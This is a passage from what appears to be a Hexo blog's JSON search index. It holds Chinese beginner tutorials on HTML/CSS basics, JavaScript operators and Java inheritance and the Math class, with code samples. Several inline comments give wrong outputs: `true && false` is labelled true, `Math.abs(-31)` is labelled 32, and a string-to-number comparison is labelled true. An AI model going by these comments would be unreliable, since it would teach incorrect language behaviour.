class=\"blue\"&gt;落霞与孤鹜齐飞&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"内联和块元素","slug":"html-css00017内联和块元素","date":"2020-03-07T14:11:22.000Z","updated":"2020-03-07T14:26:03.261Z","comments":true,"path":"2020/03/07/html-css00017内联和块元素/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/07/html-css00017内联和块元素/","excerpt":"","text":"内联和块元素 块元素和内联元素 div就是一个块元素 所谓的块元素就是会独占一行的元素,无论他的内容有多少他都会独占一行. 常见的块元素: p h1 h2 h3 ... div这个标签没有任何语义,就是一个纯粹的块元素, 并且不会为它里边的元素设置任何的默认样式 div元素主要用来对页面进行布局的 span是一个内联元素(行内元素) 所谓的行内元素,指的是只占自身大小的元素,不会占用一行. 常见的内联元素: a img iframe span span没有任何的语义,span标签专门用来选中文字, 然后为文字来设置样式. 块元素主要用来做页面布局的,内联元素主要用来选中文本设置样式. 一般情况下只使用块元素去包含内联元素,而不会使用内联元素去包含一个块元素 a元素可以包含任意元素,除了他本身 p元素不可以包含任何块元素 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"background-color:red;\"&gt;我是一个块元素&lt;/div&gt; &lt;span style=\"background-color:blue;\"&gt;我是一个内联元素&lt;/span&gt; &lt;a href=\"#\"&gt; &lt;div&gt;我被a元素包含&lt;/div&gt; &lt;/a&gt; &lt;!-- 错误写法 --&gt; &lt;p&gt; &lt;p&gt;我是错误写法&lt;/p&gt; &lt;/p&gt; &lt;span&gt; &lt;div&gt; 我是错误写法 &lt;/div&gt; &lt;/span&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"CSS语法","slug":"html-css00016CSS语法","date":"2020-03-05T07:11:34.000Z","updated":"2020-03-05T07:19:53.475Z","comments":true,"path":"2020/03/05/html-css00016CSS语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/05/html-css00016CSS语法/","excerpt":"","text":"CSS语法 CSS中的注释，注释中的内容会自动被浏览器所忽略 HTML中的&lt;!----&gt;注释在&lt;style&gt;标签内或css文件中是不能使用的 css注释语法 123/*注释内容*/ CSS的基本语法: 选择器 声明块 1234p&#123; 属性名1:值; 属性名2:值;&#125; 选择器，通过选择器可以选中页面中的指定元素 比如 p 的作用就是选中页面中所有的p元素 声明块，通过声明块来指定要为元素设置的样式 声明块由一个一个的声明组成 声明是一个名值对结构 一个样式名对应一个样式值，名和值之间以:连接，以;结尾 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; p&#123; color: red; font-size: 40px; &#125; h1&#123; color: green; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;我是H1&lt;/h1&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"css简介","slug":"html-css00015css简介","date":"2020-03-04T10:18:17.000Z","updated":"2020-03-04T10:44:14.901Z","comments":true,"path":"2020/03/04/html-css00015css简介/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/html-css00015css简介/","excerpt":"","text":"css简介 网页分成三个部分： 结构(HTML) 表现(CSS) 行为(JavaScript) CSS 层叠样式表 网页实际上是一个多层的结构，通过CSS可以分别为网页的每一个层来设置样式 而最终我们能看到只是网页的最上边一层 总之一句话，CSS用来设置网页中元素的样式 使用CSS来修改元素的样式 第一种方式(内联样式，行内样式)： 在标签内部通过style属性来设置元素的样式 问题： 使用内联样式，样式只能对一个标签生效， 如果希望影响到多个元素必须在每一个元素中都复制一遍 并且当样式发生变化时，我们必须要一个一个的修改，非常的不方便 注意： 开发时绝对不要使用内联样式 &lt;p style=&quot;color:red; font-size: 60px;&quot;&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt; &lt;p style=&quot;color: red; font-size: 60px;&quot;&gt;今天天气真不错！&lt;/p&gt; 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 我是内联样式 --&gt;&lt;p style=\"color:red; font-size: 60px;\"&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt;&lt;p style=\"color:red; font-size: 60px;\"&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt;&lt;p style=\"color:red; font-size: 60px;\"&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 第二种方式（内部样式表） 将样式编写到head中的style标签里 然后通过CSS的选择器来选中元素并为其设置各种样式 可以同时为多个标签设置样式，并且修改时只需要修改一处即可全部应用 内部样式表更加方便对样式进行复用 问题： 我们的内部样式表只能对一个网页起作用， 它里边的样式不能跨页面进行复用 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; p&#123; color: green; font-size: 50px; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;少小离家老大回，乡音无改鬓毛衰&lt;p&gt; &lt;/body&gt;&lt;/html&gt; 第三种方式 （外部样式表） 最佳实践 可以将CSS样式编写到一个外部的CSS文件中, 然后通过link标签来引入外部的CSS文件 外部样式表需要通过link标签进行引入， 意味着只要想使用这些样式的网页都可以对其进行引用 使样式可以在不同页面之间进行复用 将样式编写到外部的CSS文件中，可以使用到浏览器的缓存机制， 从而加快网页的加载速度，提高用户的体验。 例如有一个网站X,一个网站通常有多个页面,如果多个页面共用一个css样式文件时,当用户打开A页面时,需要加载css文件,但当用户打开B页面或C页面时就不需要加载了.这就是缓存 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"./style.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; 少小离家老大回，乡音无改鬓毛衰 &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; style.css 1234 p&#123; color: green; font-size: 50px;&#125;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"JS条件运算符","slug":"JS00024条件运算符","date":"2020-03-04T09:35:31.000Z","updated":"2020-03-04T09:41:48.361Z","comments":true,"path":"2020/03/04/JS00024条件运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00024条件运算符/","excerpt":"","text":"JS条件运算符 条件运算符也叫三元运算符 语法： 条件表达式?语句1:语句2; 执行的流程： 条件运算符在执行时，首先对条件表达式进行求值， 如果该值为true，则执行语句1，并返回执行结果 如果该值为false，则执行语句2，并返回执行结果 如果条件的表达式的求值结果是一个非布尔值， 会将其转换为布尔值然后在运算 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; //false?alert(\"语句1\"):alert(\"语句2\"); var a = 300; var b = 143; var c = 50; //a &gt; b ? alert(\"a大\"):alert(\"b大\"); //获取a和b中的最大值 //var max = a &gt; b ? a : b; //获取a b c 中的大值 //max = max &gt; c ? max : c; //这种写法不推荐使用，不方便阅读 var max = a &gt; b ? (a &gt; c ? a :c) : (b &gt; c ? b : c); //console.log(\"max = \"+max); //\"hello\"?alert(\"语句1\"):alert(\"语句2\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS相等运算符","slug":"JS00023相等运算符","date":"2020-03-04T07:51:43.000Z","updated":"2020-03-04T08:12:42.267Z","comments":true,"path":"2020/03/04/JS00023相等运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00023相等运算符/","excerpt":"","text":"JS相等运算符 相等运算符用来比较两个值是否相等， 如果相等会返回true，否则返回false 使用 == 来做相等运算 当使用==来比较两个值时，如果值的类型不同， 则会自动进行类型转换，将其转换为相同的类型 然后在比较 不相等!= 不相等用来判断两个值是否不相等，如果不相等返回true，否则返回false 使用!=来做不相等运算 不相等也会对变量进行自动的类型转换，如果转换后相等它也会返回false 全等=== - 用来判断两个值是否全等，它和相等类似，不同的是它不会做自动的类型转换 如果两个值的类型不同，直接返回false 不全等!== - 用来判断两个值是否不全等，和不等类似，不同的是它不会做自动的类型转换 如果两个值的类型不同，直接返回true 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; //console.log(1 == 1); //true var a = 10; //console.log(a == 4); //false //console.log(\"1\" == 1); //true //console.log(true == \"1\"); //true //console.log(null == 0); //false /* * undefined 衍生自 null * 所以这两个值做相等判断时，会返回true */ //console.log(undefined == null); /* * NaN不和任何值相等，包括他本身 */ //console.log(NaN == NaN); //false var b = NaN; //判断b的值是否是NaN //console.log(b == NaN); /* * 可以通过isNaN()函数来判断一个值是否是NaN * 如果该值是NaN则返回true，否则返回false */ //console.log(isNaN(b)); //console.log(10 != 5); //true //console.log(10 != 10); //false //console.log(\"abcd\" != \"abcd\"); //false //console.log(\"1\" != 1);//false //console.log(\"123\" === 123);//false //console.log(null === undefined);//false console.log(1 !== \"1\"); //true &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS中Unicode编码使用","slug":"JS00022Unicode编码使用","date":"2020-03-04T07:20:38.000Z","updated":"2020-03-04T07:27:01.794Z","comments":true,"path":"2020/03/04/JS00022Unicode编码使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00022Unicode编码使用/","excerpt":"","text":"JS中Unicode编码使用 在JS中使用Unicode编码. 格式: \\u编码(十六进制) 编码一般都是十六进制的 在html中使用unicode编码. 格式: &amp;#编码;(十进制) 后面一定要有分号. 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; /* * 在字符串中使用转义字符输入Unicode编码 * \\u四位编码 */ console.log(\"\\u2620\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!--在网页中使用Unicode编码 &amp;#编码; 这里的编码需要的是10进制 --&gt; &lt;h1 style=\"font-size: 200px;\"&gt;&amp;#9760;&lt;/h1&gt; &lt;h1 style=\"font-size: 200px;\"&gt;&amp;#9856;&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS关系运算符","slug":"JS00021关系运算符","date":"2020-03-04T06:58:02.000Z","updated":"2020-03-04T07:05:39.386Z","comments":true,"path":"2020/03/04/JS00021关系运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00021关系运算符/","excerpt":"","text":"JS关系运算符 通过关系运算符可以比较两个值之间的大小关系， 如果关系成立它会返回true，如果关系不成立则返回false &gt; 大于号 - 判断符号左侧的值是否大于右侧的值 - 如果关系成立，返回true，如果关系不成立则返回false &gt;= 大于等于 - 判断符号左侧的值是否大于或等于右侧的值 &lt; 小于号 &lt;= 小于等于 非数值的情况 - 对于非数值进行比较时，会将其转换为数字然后在比较 - 如果符号两侧的值都是字符串时，不会将其转换为数字进行比较 而会分别比较字符串中字符的Unicode编码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; var result = 5 &gt; 10;//false result = 5 &gt; 4; //true result = 5 &gt; 5; //false result = 5 &gt;= 5; //true result = 5 &gt;= 4; //true result = 5 &lt; 4; //false result = 4 &lt;= 4; //true //console.log(\"result = \"+result); //console.log(1 &gt; true); //false //console.log(1 &gt;= true); //true //console.log(1 &gt; \"0\"); //true //console.log(10 &gt; null); //true //任何值和NaN做任何比较都是false //console.log(10 &lt;= \"hello\"); //false //console.log(true &gt; false); //true //console.log(\"1\" &lt; \"5\"); //true //console.log(\"11\" &lt; \"5\"); //true //比较两个字符串时，比较的是字符串的字符编码 //console.log(\"a\" &lt; \"b\");//true //比较字符编码时是一位一位进行比较 //如果两位一样，则比较下一位，所以借用它来对英文进行排序 //console.log(\"abc\" &lt; \"bcd\");//true //比较中文时没有意义 //console.log(\"戒\" &gt; \"我\"); //true //如果比较的两个字符串型的数字，可能会得到不可预期的结果 //注意：在比较两个字符串型的数字时，一定一定一定要转型 console.log(\"11123123123123123123\" &lt; +\"5\"); //true &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS赋值运算符","slug":"JS00020赋值运算符","date":"2020-03-04T06:39:30.000Z","updated":"2020-03-04T06:44:47.029Z","comments":true,"path":"2020/03/04/JS00020赋值运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00020赋值运算符/","excerpt":"","text":"JS赋值运算符 = 可以将符号右侧的值赋值给符号左侧的变量 += a += 5 等价于 a = a + 5 -= a -= 5 等价于 a = a - 5 *= a \\*= 5 等价于 a = a \\* 5 /= a /= 5 等价于 a = a / 5 %= a %= 5 等价于 a = a % 5 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt; &lt;/title&gt; &lt;script type=\"text/javascript\"&gt; var a = 10; //a = a + 5; //a += 5; //a -= 5; //a *= 5; // a = a%3; a %= 3; console.log(\"a = \"+a); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS非布尔值的与或运算","slug":"JS00019非布尔值的与或运算","date":"2020-03-04T06:30:12.000Z","updated":"2020-03-04T06:35:58.138Z","comments":true,"path":"2020/03/04/JS00019非布尔值的与或运算/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00019非布尔值的与或运算/","excerpt":"","text":"JS非布尔值的与或运算 &amp;&amp; || 非布尔值的情况 ​ - 对于非布尔值进行与或运算时， ​ 会先将其转换为布尔值，然后再运算，并且返回原值 ​ - 与运算： ​ - 如果第一个值为true，则必然返回第二个值 ​ - 如果第一个值为false，则直接返回第一个值 - 或运算 ​ - 如果第一个值为true，则直接返回第一个值 ​ - 如果第一个值为false，则返回第二个值 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; //true &amp;&amp; true //与运算：如果两个值都为true，则返回后边的 var result = 5 &amp;&amp; 6; //与运算：如果两个值中有false，则返回靠前的false //false &amp;&amp; true result = 0 &amp;&amp; 2; result = 2 &amp;&amp; 0; //false &amp;&amp; false result = NaN &amp;&amp; 0; result = 0 &amp;&amp; NaN; //true || true //如果第一个值为true，则直接返回第一个值 result = 2 || 1; result = 2 || NaN; result = 2 || 0; //如果第一个值为false，则直接返回第二个值 result = NaN || 1; result = NaN || 0; result = \"\" || \"hello\"; result = -1 || \"你好\"; console.log(\"result = \"+result); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS逻辑运算符","slug":"JS00018逻辑运算符","date":"2020-03-04T05:57:47.000Z","updated":"2020-03-04T06:20:25.112Z","comments":true,"path":"2020/03/04/JS00018逻辑运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00018逻辑运算符/","excerpt":"","text":"JS逻辑运算符 JS中为我们提供了三种逻辑运算符 ! 非 - !可以用来对一个值进行非运算 - 所谓非运算就是值对一个布尔值进行取反操作， 变false，false变true - 如果对一个值进行两次取反，它不会变化 - 如果对非布尔值进行元素，则会将其转换为布尔值，然后再取反 所以我们可以利用该特点，来将一个其他的数据类型转换为布尔值 可以为一个任意数据类型取两次反，来将其转换为布尔值， 原理和Boolean()函数一样 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //取反 var a = true; a = !a; console.log(\"a:\" + a); //不会变化 var b = true; console.log(\"b:\" + !!b); var c = 1; console.log(\"c:\" + !!c); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; &amp;&amp; 与 - &amp;&amp;可以对符号两侧的值进行与运算并返回结果 - 运算规则 - 两个值中只要有一个值为false就返回false， 只有两个值都为true时，才会返回true - JS中的“与”属于短路的与， 如果第一个值为false，则不会看第二个值 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a = true &amp;&amp; true; console.log(\"a:\" + a);//true a = true &amp;&amp; false; console.log(\"a:\" + a);//true a = true &amp;&amp; alert(\"我出来了\"); a = false &amp;&amp; alert(\"我不出来了\"); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; || 或 - ||可以对符号两侧的值进行或运算并返回结果 - 运算规则： - 两个值中只要有一个true，就返回true 如果两个值都为false，才返回false - JS中的“或”属于短路的或 如果第一个值为true，则不会检查第二个值 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a = true || false; console.log(\"a:\" + a); a = false || false; console.log(\"a:\" + a); false || alert(\"我出来了\"); true || alert(\"我不出来\"); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS自增自减运算符","slug":"JS00017自增自减运算符","date":"2020-03-03T14:12:16.000Z","updated":"2020-03-03T14:30:44.900Z","comments":true,"path":"2020/03/03/JS00017自增自减运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/JS00017自增自减运算符/","excerpt":"","text":"JS自增自减运算符 ++ 分为前++(++a)和后++ (a++) 前++ (++a),先加1,再使用. 后++ (a++),先使用,再加1. -- 分为前-- (--a)和后-- (a--) 前-- (--a),先减1,再使用. 后-- (a--),先使用,再减1. 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a = 10; console.log(a++);//10 console.log(++a);//12 var b = 10; console.log(b--);//10 console.log(--b);//8 &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS一元运算符","slug":"JS00016一元运算符","date":"2020-03-03T14:02:44.000Z","updated":"2020-03-03T14:10:19.467Z","comments":true,"path":"2020/03/03/JS00016一元运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/JS00016一元运算符/","excerpt":"","text":"JS一元运算符 正号: + 负号: - 如果是非Number,会自动转换为Number类型 1234567891011121314&lt;script&gt; var a = 10; console.log(\"a = \" + -a); console.log(\"a = \" + +a); var str = \"123\"; var b = 1 + +str; console.log(b); b = 124 + -str; console.log(b); &lt;/script&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"hexo常用命令","slug":"hexo常用命令","date":"2020-03-03T12:00:08.000Z","updated":"2020-03-03T12:04:54.837Z","comments":true,"path":"2020/03/03/hexo常用命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/hexo常用命令/","excerpt":"","text":"","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"java继承中方法的覆盖重写","slug":"java00079继承中方法的覆盖重写","date":"2020-03-03T11:27:05.000Z","updated":"2020-03-03T11:48:07.188Z","comments":true,"path":"2020/03/03/java00079继承中方法的覆盖重写/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00079继承中方法的覆盖重写/","excerpt":"","text":"java继承中方法的覆盖重写 重写(Override) 概念:在继承关系当中,方法的名称一样,参数列表也一样. 注意事项: 1.必须保证父子类之间方法的名称相同,参数也相同. @Override:写在方法前面,用来检测是不是有效的正确覆盖重写. @Override就算不写只要满足要求,也是正确的方法覆盖重写. 2.子类方法的返回值必须小于等于父类方法的返回值范围 java.lang.Object类是所有类的公共最高父类(祖宗类),java.lang.String就是Object的子类. 3.子类方法的权限必须大于等于父类方法的权限修饰符. public &gt; protected &gt; default &gt; private (default)不是关键字default,而是什么都不写,留空 12345678910111213141516171819202122package xiaochenyan.top.Demo001;public class Main01&#123; public static void main(String[] args) &#123; Fu fu = new Fu(); Zi zi = new Zi(); System.out.println(fu.num);//100 System.out.println(zi.num);//200 System.out.println(\"=============================================\"); zi.show(); /* 100 10 200 100 */ &#125;&#125; 12345678910111213141516171819package xiaochenyan.top.Demo001;public class Zi extends Fu&#123; int num; Zi()&#123; num = 200; &#125; @Override public void show() &#123; super.show();//保持父类的原内容不变,添加自己的新功能 int num = 10; System.out.println(num); System.out.println(this.num); System.out.println(super.num); &#125;&#125; 1234567891011121314package xiaochenyan.top.Demo001;public class Fu&#123; int num; Fu()&#123; num = 100; &#125; public void show() &#123; System.out.println(num); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java区分子类方法中重名的三种变量","slug":"java00078区分子类方法中重名的三种变量","date":"2020-03-03T06:10:51.000Z","updated":"2020-03-03T06:19:30.597Z","comments":true,"path":"2020/03/03/java00078区分子类方法中重名的三种变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00078区分子类方法中重名的三种变量/","excerpt":"","text":"java区分子类方法中重名的三种变量 局部变量: 直接写成员变量 本类的成员变量: this.成员变量 父类的成员变量: super.成员变量名 1234567891011121314package xiaochenyan.top.Demo001;public class Fu&#123; int num; Fu()&#123; num = 100; &#125; public void show() &#123; System.out.println(num); &#125;&#125; 1234567891011121314151617package xiaochenyan.top.Demo001;public class Zi extends Fu&#123; int num; Zi()&#123; num = 200; &#125; public void show() &#123; int num = 10; System.out.println(num);//使用局部num System.out.println(this.num);//使用本类num System.out.println(super.num);//使用父类num &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承中成员变量的访问特点","slug":"java00077继承中成员变量的访问特点","date":"2020-03-03T05:53:10.000Z","updated":"2020-03-03T06:05:40.494Z","comments":true,"path":"2020/03/03/java00077继承中成员变量的访问特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00077继承中成员变量的访问特点/","excerpt":"","text":"java继承中成员变量的访问特点 如果父类和子类的成员变量重名. 直接通过子类对象访问成员变量: 子类名.成员变量名(优先使用子类的重名成员变量) 间接通过成员方法访问成员变量: 方法属于A类的方法,就优先使用A类重名的成员变量 在父类和子类中,只要有方法或变量重名的,对象属于A类,就优先使用A类对象重名的变量或方法 1234567891011121314151617package xiaochenyan.top.Demo001;public class Main01&#123; public static void main(String[] args) &#123; Fu fu = new Fu(); Zi zi = new Zi(); System.out.println(fu.num);//100 System.out.println(zi.num);//200 System.out.println(\"===========================\"); fu.show();//100 zi.show();//200; &#125;&#125; 123456789101112public class Fu&#123; int num; Fu()&#123; num = 100; &#125; public void show() &#123; System.out.println(num); &#125;&#125; 1234567891011121314package xiaochenyan.top.Demo001;public class Zi extends Fu&#123; int num; Zi()&#123; num = 200; &#125; public void show() &#123; System.out.println(num); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承格式","slug":"java00076继承格式","date":"2020-03-03T04:52:58.000Z","updated":"2020-03-03T05:08:19.975Z","comments":true,"path":"2020/03/03/java00076继承格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00076继承格式/","excerpt":"","text":"java继承格式 子类定义语法: 123public class 子类名 extends 父类名称&#123; //代码块&#125; 1234567891011package xiaochenyan.top.fuZiLei;public class demo01&#123; public static void main(String[] args) &#123; Teacher xiaoMing = new Teacher(); xiaoMing.setAge(23); xiaoMing.setName(\"XiaoMing\"); xiaoMing.show(); &#125;&#125; 子类会继承父类的公有成员函数或公有变量. 1234567package xiaochenyan.top.fuZiLei;public class Teacher extends YuanGong&#123; Teacher()&#123; show(); &#125;&#125; 父类 1234567891011121314151617181920212223242526272829303132333435363738package xiaochenyan.top.fuZiLei;public class YuanGong&#123; public String name; public int age; public YuanGong(String name, int age) &#123; this.name = name; this.age = age; &#125; public YuanGong() &#123; name = null; age = 0; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; //输出公有成员变量 public void show() &#123; System.out.println(\"姓名:\"+name); System.out.println(\"年龄:\"+age); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承的概述","slug":"java00075继承的概述","date":"2020-03-03T04:44:09.000Z","updated":"2020-03-03T04:46:28.854Z","comments":true,"path":"2020/03/03/java00075继承的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00075继承的概述/","excerpt":"","text":"java继承的概述","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java小学数学真题","slug":"java00074小学数学真题","date":"2020-03-03T04:25:46.000Z","updated":"2020-03-03T04:36:55.974Z","comments":true,"path":"2020/03/03/java00074小学数学真题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00074小学数学真题/","excerpt":"","text":"java小学数学真题 计算从-10.8到5.9之间,绝对值大于6或者小于2.1的整数有多少个? 12345678910111213141516171819package xiaochenyan.top.Demo;public class Main21&#123; public static void main(String[] args) &#123; int count = 0; double min = -10.8; double max = 5.9; for (double i = min; i &lt; max; i++) &#123; double num = Math.ceil(i); double abS = Math.abs(num); if (abS &gt; 6 || abS &lt; 2.1) &#123; ++count; &#125; &#125; System.out.println(count); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数学工具类Math","slug":"java00073数学工具类Math","date":"2020-03-03T04:10:55.000Z","updated":"2020-03-03T04:24:18.410Z","comments":true,"path":"2020/03/03/java00073数学工具类Math/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00073数学工具类Math/","excerpt":"","text":"java数学工具类Math java.lang.Math类是数学相关的工具类,里面提供了大量的静态方法,完成与数学运算的操作. public static double abs(double num):获取绝对值. public static double ceil(double num):向上取整. public static double floor(double num):向下取整. public static long round(double num):四舍五入. Math.PI代表圆周率 123456789101112131415161718192021222324252627282930313233package xiaochenyan.top.Demo;public class Main20&#123; public static void main(String[] args) &#123; double a = 31.2; double b = 31.9; double c = 31.0; //取绝对值 System.out.println(Math.abs(-31));//32 System.out.println(\"==========================================\"); //向上取整 System.out.println(Math.ceil(a));//32 System.out.println(Math.ceil(b));//32 